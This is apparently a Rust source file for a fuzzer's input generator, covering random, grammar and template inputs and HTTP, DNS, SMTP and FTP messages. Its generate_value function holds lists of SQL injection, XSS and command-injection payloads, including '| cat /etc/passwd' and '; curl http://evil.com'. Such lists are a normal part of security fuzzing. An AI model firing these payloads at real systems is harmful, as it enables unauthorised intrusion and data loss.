//! Input Generators
//!
//! Generate test inputs for fuzzing based on various strategies.

use rand::prelude::*;
use crate::fuzzing::types::{
    FuzzerConfig, FuzzDataType, FuzzTemplate, GrammarElement, GrammarRule,
};

/// Input generator
pub struct InputGenerator {
    rng: rand::rngs::ThreadRng,
}

impl InputGenerator {
    /// Create a new input generator
    pub fn new() -> Self {
        Self {
            rng: rand::thread_rng(),
        }
    }

    /// Generate an input based on configuration
    pub fn generate(&self, config: &FuzzerConfig) -> Vec<u8> {
        // If seeds are available, start from one
        if let Some(seeds) = &config.seeds {
            if !seeds.is_empty() {
                let mut rng = rand::thread_rng();
                if let Some(seed) = seeds.choose(&mut rng) {
                    return seed.clone();
                }
            }
        }

        // If grammar is defined, use grammar-based generation
        if config.grammar.is_some() {
            return self.generate_from_grammar(config);
        }

        // If template is defined, use template-based generation
        if let Some(template) = &config.template {
            return self.generate_from_template(template);
        }

        // Default: random bytes
        self.generate_random(config)
    }

    /// Generate random bytes
    pub fn generate_random(&self, config: &FuzzerConfig) -> Vec<u8> {
        let mut rng = rand::thread_rng();
        let min_size = config.min_input_size.unwrap_or(1);
        let max_size = config.max_input_size.unwrap_or(1024);
        let size = rng.gen_range(min_size..=max_size);

        (0..size).map(|_| rng.gen::<u8>()).collect()
    }

    /// Generate input from grammar
    pub fn generate_from_grammar(&self, config: &FuzzerConfig) -> Vec<u8> {
        let grammar_str = config.grammar.as_ref().unwrap();

        // Parse simple grammar format
        let rules = self.parse_grammar(grammar_str);
        if rules.is_empty() {
            return self.generate_random(config);
        }

        // Find the start rule
        let start_rule = rules.iter()
            .find(|r| r.name == "start" || r.name == "S")
            .or_else(|| rules.first());

        if let Some(rule) = start_rule {
            self.expand_rule(rule, &rules, 10)
        } else {
            self.generate_random(config)
        }
    }

    /// Parse a simple grammar format
    fn parse_grammar(&self, grammar_str: &str) -> Vec<GrammarRule> {
        let mut rules = Vec::new();

        for line in grammar_str.lines() {
            let line = line.trim();
            if line.is_empty() || line.starts_with('#') {
                continue;
            }

            // Format: RULE := production1 | production2
            if let Some((name, prods)) = line.split_once(":=") {
                let name = name.trim().to_string();
                let productions: Vec<_> = prods.split('|')
                    .map(|p| {
                        let elements: Vec<_> = p.trim()
                            .split_whitespace()
                            .map(|e| {
                                if e.starts_with('"') && e.ends_with('"') {
                                    GrammarElement::Terminal {
                                        value: e[1..e.len()-1].to_string()
                                    }
                                } else if e.starts_with('[') && e.ends_with(']') {
                                    // Range like [a-z]
                                    let inner = &e[1..e.len()-1];
                                    if inner.len() == 3 && inner.chars().nth(1) == Some('-') {
                                        let min = inner.chars().next().unwrap() as u8;
                                        let max = inner.chars().nth(2).unwrap() as u8;
                                        GrammarElement::Range { min, max }
                                    } else {
                                        GrammarElement::Terminal { value: e.to_string() }
                                    }
                                } else {
                                    GrammarElement::NonTerminal { name: e.to_string() }
                                }
                            })
                            .collect();
                        crate::fuzzing::types::GrammarProduction {
                            elements,
                            weight: None,
                        }
                    })
                    .collect();

                rules.push(GrammarRule {
                    name,
                    productions,
                    weight: None,
                });
            }
        }

        rules
    }

    /// Expand a grammar rule to produce output
    fn expand_rule(&self, rule: &GrammarRule, all_rules: &[GrammarRule], depth: u32) -> Vec<u8> {
        if depth == 0 || rule.productions.is_empty() {
            return Vec::new();
        }

        let mut rng = rand::thread_rng();
        let production = rule.productions.choose(&mut rng).unwrap();
        let mut result = Vec::new();

        for element in &production.elements {
            result.extend(self.expand_element(element, all_rules, depth - 1));
        }

        result
    }

    /// Expand a grammar element
    fn expand_element(&self, element: &GrammarElement, all_rules: &[GrammarRule], depth: u32) -> Vec<u8> {
        let mut rng = rand::thread_rng();

        match element {
            GrammarElement::Terminal { value } => value.as_bytes().to_vec(),
            GrammarElement::NonTerminal { name } => {
                if let Some(rule) = all_rules.iter().find(|r| &r.name == name) {
                    self.expand_rule(rule, all_rules, depth)
                } else {
                    Vec::new()
                }
            }
            GrammarElement::Range { min, max } => {
                vec![rng.gen_range(*min..=*max)]
            }
            GrammarElement::Repeat { element, min, max } => {
                let count = rng.gen_range(*min..=*max);
                let mut result = Vec::new();
                for _ in 0..count {
                    result.extend(self.expand_element(element, all_rules, depth));
                }
                result
            }
            GrammarElement::Optional { element } => {
                if rng.gen_bool(0.5) {
                    self.expand_element(element, all_rules, depth)
                } else {
                    Vec::new()
                }
            }
            GrammarElement::Choice { elements } => {
                if let Some(e) = elements.choose(&mut rng) {
                    self.expand_element(e, all_rules, depth)
                } else {
                    Vec::new()
                }
            }
        }
    }

    /// Generate input from template
    pub fn generate_from_template(&self, template: &FuzzTemplate) -> Vec<u8> {
        let mut result = template.content.clone();

        for fuzz_point in &template.fuzz_points {
            let placeholder = format!("{{{{{}}}}}", fuzz_point.name);
            let value = self.generate_value(&fuzz_point.data_type, fuzz_point.min_length, fuzz_point.max_length);
            result = result.replace(&placeholder, &String::from_utf8_lossy(&value));
        }

        result.into_bytes()
    }

    /// Generate a value of a specific type
    pub fn generate_value(&self, data_type: &FuzzDataType, min_len: Option<usize>, max_len: Option<usize>) -> Vec<u8> {
        let mut rng = rand::thread_rng();
        let min = min_len.unwrap_or(1);
        let max = max_len.unwrap_or(256);
        let len = rng.gen_range(min..=max);

        match data_type {
            FuzzDataType::String => {
                self.generate_random_string(len)
            }
            FuzzDataType::Integer => {
                let val: i64 = rng.gen();
                val.to_string().into_bytes()
            }
            FuzzDataType::Float => {
                let val: f64 = rng.gen_range(-1e10..1e10);
                val.to_string().into_bytes()
            }
            FuzzDataType::Binary => {
                (0..len).map(|_| rng.gen::<u8>()).collect()
            }
            FuzzDataType::Email => {
                let user = self.generate_random_string(8);
                let domain = self.generate_random_string(6);
                format!("{}@{}.com", String::from_utf8_lossy(&user), String::from_utf8_lossy(&domain)).into_bytes()
            }
            FuzzDataType::Url => {
                let path = self.generate_random_string(16);
                format!("http://test.local/{}", String::from_utf8_lossy(&path)).into_bytes()
            }
            FuzzDataType::Path => {
                let segments: Vec<String> = (0..rng.gen_range(1..=5))
                    .map(|_| String::from_utf8_lossy(&self.generate_random_string(6)).to_string())
                    .collect();
                format!("/{}", segments.join("/")).into_bytes()
            }
            FuzzDataType::SqlInjection => {
                let payloads = vec![
                    "' OR '1'='1",
                    "'; DROP TABLE users; --",
                    "1' AND '1'='1",
                    "admin'--",
                    "1; SELECT * FROM users",
                    "' UNION SELECT NULL,NULL,NULL--",
                    "1' ORDER BY 1--",
                    "') OR ('1'='1",
                ];
                payloads.choose(&mut rng).unwrap().as_bytes().to_vec()
            }
            FuzzDataType::XssPayload => {
                let payloads = vec![
                    "<script>alert(1)</script>",
                    "<img src=x onerror=alert(1)>",
                    "<svg onload=alert(1)>",
                    "javascript:alert(1)",
                    "<body onload=alert(1)>",
                    "'\"><script>alert(1)</script>",
                    "<iframe src='javascript:alert(1)'>",
                    "<input onfocus=alert(1) autofocus>",
                ];
                payloads.choose(&mut rng).unwrap().as_bytes().to_vec()
            }
            FuzzDataType::CommandInjection => {
                let payloads = vec![
                    "; ls -la",
                    "| cat /etc/passwd",
                    "`id`",
                    "$(whoami)",
                    "; ping -c 1 127.0.0.1",
                    "& dir",
                    "| type C:\\Windows\\System32\\drivers\\etc\\hosts",
                    "; curl http://evil.com",
                ];
                payloads.choose(&mut rng).unwrap().as_bytes().to_vec()
            }
            FuzzDataType::FormatString => {
                let count = rng.gen_range(1..=20);
                let specifier = ["%n", "%s", "%x", "%p", "%d"].choose(&mut rng).unwrap();
                specifier.repeat(count).into_bytes()
            }
            FuzzDataType::Unicode => {
                self.generate_unicode_string(len)
            }
            FuzzDataType::Custom => {
                (0..len).map(|_| rng.gen::<u8>()).collect()
            }
        }
    }

    /// Generate a random alphanumeric string
    fn generate_random_string(&self, len: usize) -> Vec<u8> {
        let mut rng = rand::thread_rng();
        const CHARSET: &[u8] = b"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        (0..len)
            .map(|_| CHARSET[rng.gen_range(0..CHARSET.len())])
            .collect()
    }

    /// Generate a Unicode string with various edge cases
    fn generate_unicode_string(&self, len: usize) -> Vec<u8> {
        let mut rng = rand::thread_rng();
        let mut result = String::new();

        for _ in 0..len {
            let char_type = rng.gen_range(0..10);
            let c = match char_type {
                0 => '\0',                         // Null
                1 => '\u{FFFE}',                   // BOM
                2 => '\u{FFFF}',                   // Invalid
                3 => '\u{202E}',                   // Right-to-left override
                4 => '\u{200B}',                   // Zero-width space
                5 => '\u{1F4A9}',                  // Emoji
                6 => rng.gen_range('\u{0080}'..'\u{00FF}'), // Latin extended
                7 => rng.gen_range('\u{0400}'..'\u{04FF}'), // Cyrillic
                8 => rng.gen_range('\u{4E00}'..'\u{9FFF}'), // CJK
                _ => rng.gen_range('a'..='z'),     // ASCII
            };
            result.push(c);
        }

        result.into_bytes()
    }

    /// Generate HTTP fuzzing payload
    pub fn generate_http_payload(&self) -> Vec<u8> {
        let mut rng = rand::thread_rng();

        let methods = ["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS", "HEAD", "TRACE"];
        let method = methods.choose(&mut rng).unwrap();

        let path_len = rng.gen_range(1..=100);
        let path = String::from_utf8_lossy(&self.generate_random_string(path_len)).to_string();

        let headers = vec![
            format!("Host: test.local"),
            format!("Content-Length: {}", rng.gen_range(0..10000)),
            format!("Content-Type: application/json"),
            format!("User-Agent: Fuzzer/1.0"),
            format!("X-Custom: {}", String::from_utf8_lossy(&self.generate_random_string(32))),
        ];

        let body_len = rng.gen_range(0..=1024);
        let body: Vec<u8> = (0..body_len).map(|_| rng.gen::<u8>()).collect();

        let mut request = format!(
            "{} /{} HTTP/1.1\r\n{}\r\n\r\n",
            method,
            path,
            headers.join("\r\n")
        ).into_bytes();

        request.extend(body);
        request
    }

    /// Generate protocol message for common protocols
    pub fn generate_protocol_message(&self, protocol: &str) -> Vec<u8> {
        let mut rng = rand::thread_rng();

        match protocol.to_lowercase().as_str() {
            "http" => self.generate_http_payload(),
            "dns" => self.generate_dns_query(),
            "smtp" => self.generate_smtp_command(),
            "ftp" => self.generate_ftp_command(),
            _ => {
                // Generic binary protocol
                let len = rng.gen_range(16..=512);
                (0..len).map(|_| rng.gen::<u8>()).collect()
            }
        }
    }

    /// Generate a DNS query
    fn generate_dns_query(&self) -> Vec<u8> {
        let mut rng = rand::thread_rng();
        let mut query = Vec::new();

        // Transaction ID
        query.extend(&[rng.gen::<u8>(), rng.gen::<u8>()]);
        // Flags: Standard query
        query.extend(&[0x01, 0x00]);
        // Questions: 1
        query.extend(&[0x00, 0x01]);
        // Answer, Authority, Additional RRs: 0
        query.extend(&[0x00, 0x00, 0x00, 0x00, 0x00, 0x00]);

        // Domain name
        let domain = self.generate_random_string(rng.gen_range(3..=20));
        query.push(domain.len() as u8);
        query.extend(&domain);
        query.push(3); // "com"
        query.extend(b"com");
        query.push(0); // End of domain

        // Type: A (1)
        query.extend(&[0x00, 0x01]);
        // Class: IN (1)
        query.extend(&[0x00, 0x01]);

        query
    }

    /// Generate an SMTP command
    fn generate_smtp_command(&self) -> Vec<u8> {
        let mut rng = rand::thread_rng();
        let commands = ["HELO", "EHLO", "MAIL FROM:", "RCPT TO:", "DATA", "QUIT", "VRFY", "EXPN"];
        let cmd = commands.choose(&mut rng).unwrap();

        let arg = if cmd.ends_with(':') {
            format!("<{}>", String::from_utf8_lossy(&self.generate_value(&FuzzDataType::Email, Some(5), Some(50))))
        } else {
            String::from_utf8_lossy(&self.generate_random_string(rng.gen_range(5..=50))).to_string()
        };

        format!("{} {}\r\n", cmd, arg).into_bytes()
    }

    /// Generate an FTP command
    fn generate_ftp_command(&self) -> Vec<u8> {
        let mut rng = rand::thread_rng();
        let commands = ["USER", "PASS", "LIST", "RETR", "STOR", "CWD", "PWD", "QUIT", "PORT", "PASV"];
        let cmd = commands.choose(&mut rng).unwrap();

        let arg = String::from_utf8_lossy(&self.generate_random_string(rng.gen_range(1..=50))).to_string();

        format!("{} {}\r\n", cmd, arg).into_bytes()
    }
}

impl Default for InputGenerator {
    fn default() -> Self {
        Self::new()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_generate_random() {
        let generator = InputGenerator::new();
        let config = FuzzerConfig {
            mutation_strategies: None,
            grammar: None,
            template: None,
            dictionary: None,
            seeds: None,
            max_input_size: Some(100),
            min_input_size: Some(10),
            max_iterations: None,
            max_runtime_secs: None,
            enable_coverage: None,
            workers: None,
        };

        let result = generator.generate_random(&config);
        assert!(result.len() >= 10);
        assert!(result.len() <= 100);
    }

    #[test]
    fn test_generate_sql_injection() {
        let generator = InputGenerator::new();
        let result = generator.generate_value(&FuzzDataType::SqlInjection, None, None);
        assert!(!result.is_empty());
    }

    #[test]
    fn test_generate_http_payload() {
        let generator = InputGenerator::new();
        let result = generator.generate_http_payload();
        assert!(result.starts_with(b"GET ") || result.starts_with(b"POST ") ||
                result.starts_with(b"PUT ") || result.starts_with(b"DELETE ") ||
                result.starts_with(b"PATCH ") || result.starts_with(b"OPTIONS ") ||
                result.starts_with(b"HEAD ") || result.starts_with(b"TRACE "));
    }
}
